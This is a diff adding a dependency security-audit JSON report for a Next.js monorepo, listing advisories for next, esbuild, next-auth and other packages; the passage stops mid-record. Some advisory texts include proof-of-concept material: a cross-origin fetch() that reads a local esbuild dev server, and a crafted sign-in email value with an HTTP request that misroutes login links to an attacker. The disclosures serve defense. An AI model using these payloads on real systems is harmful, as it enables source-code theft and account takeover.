@@ -1,0 +1,1769 @@
+﻿{
+  "actions": [
+    {
+      "action": "review",
+      "module": "next",
+      "resolves": [
+        {
+          "id": 1101437,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1105462,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107228,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107514,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107515,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108410,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111372,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111381,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111390,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112593,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112653,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113688,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114897,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114940,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116376,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1117931,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118942,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118944,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118946,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118948,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118950,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118952,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118954,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118958,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1118962,
+          "path": "apps__web>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": "apps__web>vitest>vite>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1102341,
+          "path": "packages__core>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1102341,
+          "path": "packages__core>drizzle-kit>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "next-auth",
+      "resolves": [
+        {
+          "id": 1109304,
+          "path": "apps__web>next-auth",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vite",
+      "resolves": [
+        {
+          "id": 1116229,
+          "path": "apps__web>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120784,
+          "path": "apps__web>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120789,
+          "path": "apps__web>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "drizzle-orm",
+      "resolves": [
+        {
+          "id": 1116251,
+          "path": "apps__web>drizzle-orm",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "postcss",
+      "resolves": [
+        {
+          "id": 1117015,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vitest",
+      "resolves": [
+        {
+          "id": 1120126,
+          "path": "apps__web>vitest",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1101437": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9\n- https://nvd.nist.gov/vuln/detail/CVE-2024-56332\n- https://github.com/advisories/GHSA-7m27-7ghc-44w9",
+      "created": "2025-01-03T20:19:29.000Z",
+      "id": 1101437,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.\n\n_Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time._\n\nDeployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.\n\nThis is the same issue as if the incoming HTTP request has an invalid `Content-Length` header or never closes. If the host has no other mitigations to those then this vulnerability is novel.\n\nThis vulnerability affects only Next.js deployments using Server Actions.\n\n### Patches\n\nThis vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.\n\n### Workarounds\n\nThere are no official workarounds for this vulnerability.\n\n### Credits\n\nThanks to the PackDraw team for responsibly disclosing this vulnerability.",
+      "reported_by": null,
+      "title": "Next.js Allows a Denial of Service (DoS) with Server Actions",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-56332"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <15.1.2",
+      "github_advisory_id": "GHSA-7m27-7ghc-44w9",
+      "recommendation": "Upgrade to version 15.1.2 or later",
+      "patched_versions": ">=15.1.2",
+      "updated": "2025-01-07T16:24:09.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-7m27-7ghc-44w9"
+    },
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.21.5",
+          "paths": [
+            "apps\\web > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "apps\\web > vitest@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "apps\\web > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\core > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\core > vitest@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\core > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > vite@5.4.21 > esbuild@0.21.5",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21 > esbuild@0.21.5"
+          ]
+        },
+        {
+          "version": "0.18.20",
+          "paths": [
+            "packages\\core > drizzle-kit@0.28.1 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20"
+          ]
+        },
+        {
+          "version": "0.19.12",
+          "paths": [
+            "packages\\core > drizzle-kit@0.28.1 > esbuild@0.19.12",
+            "packages\\core > drizzle-kit@0.28.1 > esbuild-register@3.6.0 > esbuild@0.19.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1105462": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r\n- https://vercel.com/changelog/cve-2025-48068\n- https://nvd.nist.gov/vuln/detail/CVE-2025-48068\n- https://github.com/advisories/GHSA-3h52-269p-cp9r",
+      "created": "2025-05-28T21:52:13.000Z",
+      "id": 1105462,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA low-severity vulnerability in **Next.js** has been fixed in **version 15.2.2**. This issue may have allowed limited source code exposure when the dev server was running with the App Router enabled. The vulnerability only affects local development environments and requires the user to visit a malicious webpage while `npm run dev` is active.\n\nBecause the mitigation is potentially a breaking change for some development setups, to opt-in to the fix, you must configure `allowedDevOrigins` in your next config after upgrading to a patched version. [Learn more](https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins).\n\nLearn more: https://vercel.com/changelog/cve-2025-48068\n\n## Credit\n\nThanks to [sapphi-red](https://github.com/sapphi-red) and [Radman Siddiki](https://github.com/R4356th) for responsibly disclosing this issue.",
+      "reported_by": null,
+      "title": "Information exposure in Next.js dev server due to lack of origin verification",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-48068"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <15.2.2",
+      "github_advisory_id": "GHSA-3h52-269p-cp9r",
+      "recommendation": "Upgrade to version 15.2.2 or later",
+      "patched_versions": ">=15.2.2",
+      "updated": "2025-06-13T14:41:22.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1385"
+      ],
+      "url": "https://github.com/advisories/GHSA-3h52-269p-cp9r"
+    },
+    "1107228": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-g5qg-72qw-gw5v\n- https://github.com/vercel/next.js/pull/82114\n- https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd\n- https://vercel.com/changelog/cve-2025-57752\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57752\n- https://github.com/advisories/GHSA-g5qg-72qw-gw5v",
+      "created": "2025-08-29T22:06:22.000Z",
+      "id": 1107228,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in Next.js Image Optimization has been fixed in v15.4.5 and v14.2.31. When images returned from API routes vary based on request headers (such as `Cookie` or `Authorization`), these responses could be incorrectly cached and served to unauthorized users due to a cache key confusion bug.\n\nAll users are encouraged to upgrade if they use API routes to serve images that depend on request headers and have image optimization enabled.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57752)",
+      "reported_by": null,
+      "title": "Next.js Affected by Cache Key Confusion for Image Optimization API Routes",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57752"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <=15.4.4",
+      "github_advisory_id": "GHSA-g5qg-72qw-gw5v",
+      "recommendation": "Upgrade to version 15.4.5 or later",
+      "patched_versions": ">=15.4.5",
+      "updated": "2025-09-03T13:01:55.000Z",
+      "cvss": {
+        "score": 6.2,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-g5qg-72qw-gw5v"
+    },
+    "1107514": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-xv57-4mr9-wg8v\n- https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd\n- http://vercel.com/changelog/cve-2025-55173\n- https://nvd.nist.gov/vuln/detail/CVE-2025-55173\n- https://vercel.com/changelog/cve-2025-55173\n- https://github.com/advisories/GHSA-xv57-4mr9-wg8v",
+      "created": "2025-08-29T21:59:55.000Z",
+      "id": 1107514,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in **Next.js Image Optimization** has been fixed in **v15.4.5** and **v14.2.31**. The issue allowed attacker-controlled external image sources to trigger file downloads with arbitrary content and filenames under specific configurations. This behavior could be abused for phishing or malicious file delivery.\n\nAll users relying on `images.domains` or `images.remotePatterns` are encouraged to upgrade and verify that external image sources are strictly validated.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-55173)",
+      "reported_by": null,
+      "title": "Next.js Content Injection Vulnerability for Image Optimization",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-55173"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <=15.4.4",
+      "github_advisory_id": "GHSA-xv57-4mr9-wg8v",
+      "recommendation": "Upgrade to version 15.4.5 or later",
+      "patched_versions": ">=15.4.5",
+      "updated": "2025-09-11T15:35:25.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20"
+      ],
+      "url": "https://github.com/advisories/GHSA-xv57-4mr9-wg8v"
+    },
+    "1107515": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-4342-x723-ch2f\n- https://github.com/vercel/next.js/commit/9c9aaed5bb9338ef31b0517ccf0ab4414f2093d8\n- https://vercel.com/changelog/cve-2025-57822\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57822\n- https://github.com/advisories/GHSA-4342-x723-ch2f",
+      "created": "2025-08-29T21:33:09.000Z",
+      "id": 1107515,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in **Next.js Middleware** has been fixed in **v14.2.32** and **v15.4.7**. The issue occurred when request headers were directly passed into `NextResponse.next()`. In self-hosted applications, this could allow Server-Side Request Forgery (SSRF) if certain sensitive headers from the incoming request were reflected back into the response.\n\nAll users implementing custom middleware logic in self-hosted environments are strongly encouraged to upgrade and verify correct usage of the `next()` function.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57822)",
+      "reported_by": null,
+      "title": "Next.js Improper Middleware Redirect Handling Leads to SSRF",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57822"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0-canary.0 <15.4.7",
+      "github_advisory_id": "GHSA-4342-x723-ch2f",
+      "recommendation": "Upgrade to version 15.4.7 or later",
+      "patched_versions": ">=15.4.7",
+      "updated": "2025-09-11T15:41:03.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-4342-x723-ch2f"
+    },
+    "1108410": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-qpjv-v59x-3qc4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-32421\n- https://vercel.com/changelog/cve-2025-32421\n- https://github.com/advisories/GHSA-qpjv-v59x-3qc4",
+      "created": "2025-05-15T14:12:26.000Z",
+      "id": 1108410,
+      "npm_advisory_id": null,
+      "overview": "**Summary**  \nWe received a responsible disclosure from Allam Rachid (zhero) for a low-severity race-condition vulnerability in Next.js. This issue only affects the **Pages Router** under certain misconfigurations, causing normal endpoints to serve `pageProps` data instead of standard HTML.\n\n[Learn more here](https://vercel.com/changelog/cve-2025-32421)\n\n**Credit**  \nThank you to **Allam Rachid (zhero)** for the responsible disclosure. This research was rewarded as part of our bug bounty program.",
+      "reported_by": null,
+      "title": "Next.js Race Condition to Cache Poisoning",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-32421"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <15.1.6",
+      "github_advisory_id": "GHSA-qpjv-v59x-3qc4",
+      "recommendation": "Upgrade to version 15.1.6 or later",
+      "patched_versions": ">=15.1.6",
+      "updated": "2025-09-26T17:48:30.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-362"
+      ],
+      "url": "https://github.com/advisories/GHSA-qpjv-v59x-3qc4"
+    },
+    "1109304": {
+      "findings": [
+        {
+          "version": "5.0.0-beta.25",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25",
+            "apps\\web > next-auth@5.0.0-beta.25",
+            "packages\\core > next-auth@5.0.0-beta.25"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nextauthjs/next-auth/security/advisories/GHSA-5jpx-9hw9-2fx4\n- https://github.com/nextauthjs/next-auth/commit/82efcf81f218aae43683f8dd2f7c260ef69b3ece\n- https://github.com/nextauthjs/next-auth/commit/8f3b2c7af0fe08973a12f616517c3ec85a5cd172\n- https://github.com/advisories/GHSA-5jpx-9hw9-2fx4",
+      "created": "2025-10-29T10:43:57.000Z",
+      "id": 1109304,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nNextAuth.js's email sign-in can be forced to deliver authentication emails to an attacker-controlled mailbox due to a bug in `nodemailer`'s address parser used by the project (fixed in `nodemailer` **v7.0.7**). A crafted input such as:\n\n```\n\"e@attacker.com\"@victim.com\n```\n\nis parsed incorrectly and results in the message being delivered to `e@attacker.com` (attacker) instead of `\"<e@attacker.com>@victim.com\"` (the intended recipient at `victim.com`) in violation of RFC 5321/5322 semantics. This allows an attacker to receive login/verification links or other sensitive emails intended for the victim.\n\n<h2>Affected NextAuthjs Version</h2>\n\nΓëñ Version | Afftected\n-- | --\n4.24.11 | Yes\n5.0.0-beta.29 | Yes\n\n\n## POC\n\nExample Setup showing misdelivery of email \n\n```jsx\nimport NextAuth from \"next-auth\"\nimport Nodemailer from \"next-auth/providers/nodemailer\"\nimport { PrismaAdapter } from \"@auth/prisma-adapter\"\nimport { prisma } from \"@/lib/prisma\"\n\nexport const { handlers, auth, signIn, signOut } = NextAuth({\n  adapter: PrismaAdapter(prisma),\n  providers: [\n    Nodemailer({\n      server: {\n        host: \"127.0.0.1\",\n        port: 1025,\n        ...\n      },\n      from: \"noreply@authjs.dev\",\n    }),\n  ],\n  pages: {\n    signIn: '/auth/signin',\n    verifyRequest: '/auth/verify-request',\n  },\n})\n\n```\n\n```jsx\nPOST /api/auth/signin/nodemailer HTTP/1.1\nAccept-Encoding: gzip, deflate, br, zstd\nCache-Control: no-cache\nConnection: keep-alive\nContent-Length: 176\nDNT: 1\nHost: localhost:3000\nOrigin: http://localhost:3000\nPragma: no-cache\nReferer: http://localhost:3000/auth/signin\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\naccept: */*\naccept-language: en-US,en;q=0.9,ta;q=0.8\ncontent-type: application/x-www-form-urlencoded\nsec-ch-ua: \"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Linux\"\nx-auth-return-redirect: 1\n\nemail=%22e%40attacker.coccm%22%40victim.com&csrfToken=90f5e6f48ab577ab011f212011862dcfe546459c23764cf891aab2d176f8d77a&callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fauth%2Fsignin\n```\n\n<img width=\"1247\" height=\"1408\" alt=\"Screenshot from 2025-10-25 21-15-25\" src=\"https://github.com/user-attachments/assets/456968a3-14ce-42b4-b8ca-f25b9351cf0f\" />\n<img width=\"1279\" height=\"1450\" alt=\"Screenshot from 2025-10-25 21-14-47\" src=\"https://github.com/user-attachments/assets/4e665b66-9bfe-43ce-abd3-97880972218f\" />\n\n# Mitigation\n\nUpdate to nodemailer 7.0.7\n\n## Credits\n\nhttps://zeropath.com/  Helped identify this security issue",
+      "reported_by": null,
+      "title": "NextAuthjs Email misdelivery Vulnerability",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next-auth",
+      "vulnerable_versions": ">=5.0.0-beta.0 <5.0.0-beta.30",
+      "github_advisory_id": "GHSA-5jpx-9hw9-2fx4",
+      "recommendation": "Upgrade to version 5.0.0-beta.30 or later",
+      "patched_versions": ">=5.0.0-beta.30",
+      "updated": "2025-10-29T10:43:59.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-5jpx-9hw9-2fx4"
+    },
+    "1111372": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp\n- https://nvd.nist.gov/vuln/detail/CVE-2025-55182\n- https://github.com/facebook/react/security/advisories/GHSA-fv66-9v8q-g76r\n- https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-fmh4-wr37-44fp\n- https://github.com/advisories/GHSA-9qr9-h5gf-34mp",
+      "created": "2025-12-03T19:07:11.000Z",
+      "id": 1111372,
+      "npm_advisory_id": null,
